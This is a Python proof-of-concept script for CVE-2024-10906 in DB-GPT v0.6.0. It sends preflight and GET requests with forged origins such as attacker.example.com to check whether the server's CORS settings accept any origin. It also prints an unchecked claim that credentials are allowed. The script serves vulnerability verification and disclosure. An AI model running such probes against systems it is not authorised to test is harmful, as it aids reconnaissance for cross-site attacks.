#!/usr/bin/env python3
"""
CVE-2024-10906: DB-GPT CSRF Vulnerability PoC

This PoC demonstrates that DB-GPT v0.6.0 uses an overly permissive CORS configuration
(Access-Control-Allow-Origin: *), which enables CSRF attacks.
"""
import requests
import sys


def check_cors_vulnerability(target_url):
    """Check if the target is vulnerable to CSRF via permissive CORS."""
    
    test_origins = [
        "https://attacker.example.com",
        "https://evil-site.com",
        "http://localhost:8080",
    ]
    
    print(f"[*] Target: {target_url}")
    print()
    
    vulnerable = True
    
    for malicious_origin in test_origins:
        headers = {
            "Origin": malicious_origin,
            "Access-Control-Request-Method": "POST",
            "Access-Control-Request-Headers": "Content-Type",
        }
        
        try:
            resp = requests.options(f"{target_url}/api/v1/chat/prepare", headers=headers, timeout=10)
            
            acao = resp.headers.get("Access-Control-Allow-Origin", "")
            acac = resp.headers.get("Access-Control-Allow-Credentials", "")
            
            print(f"[*] Testing Origin: {malicious_origin}")
            print(f"    Response Status: {resp.status_code}")
            print(f"    Access-Control-Allow-Origin: {acao}")
            print(f"    Access-Control-Allow-Credentials: {acac}")
            
            if acao == "*" or acao == malicious_origin:
                print(f"    [+] Origin {malicious_origin} is ALLOWED")
            else:
                print(f"    [-] Origin {malicious_origin} is NOT allowed")
                vulnerable = False
            print()
                
        except requests.exceptions.ConnectionError:
            print(f"[-] ERROR: Cannot connect to {target_url}")
            return False
        except Exception as e:
            print(f"[-] ERROR: {e}")
            return False
    
    if vulnerable:
        print("[+] VULNERABLE: Server allows cross-origin requests from any origin")
        print("[+] The CORS configuration allows_origins=['*'] with allow_credentials=True")
        print("[+] This reflects any Origin header, enabling CSRF attacks")
        
        print()
        print("[*] Testing actual cross-origin GET request...")
        get_headers = {
            "Origin": test_origins[0],
        }
        
        try:
            resp = requests.get(
                f"{target_url}/api/v1/models",
                headers=get_headers,
                timeout=10
            )
            
            print(f"[*] GET Response Status: {resp.status_code}")
            print(f"[*] GET Access-Control-Allow-Origin: {resp.headers.get('Access-Control-Allow-Origin', '')}")
        except Exception as e:
            print(f"[-] GET request error: {e}")
        
        return True
    else:
        print("[-] NOT VULNERABLE: CORS is properly configured")
        return False


def main():
    target = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:5670"
    
    print("=" * 60)
    print("CVE-2024-10906: DB-GPT CSRF Vulnerability PoC")
    print("=" * 60)
    print()
    
    result = check_cors_vulnerability(target)
    
    print()
    print("=" * 60)
    if result:
        print("Result: VULNERABLE")
        sys.exit(0)
    else:
        print("Result: NOT VULNERABLE or ERROR")
        sys.exit(1)


if __name__ == "__main__":
    main()
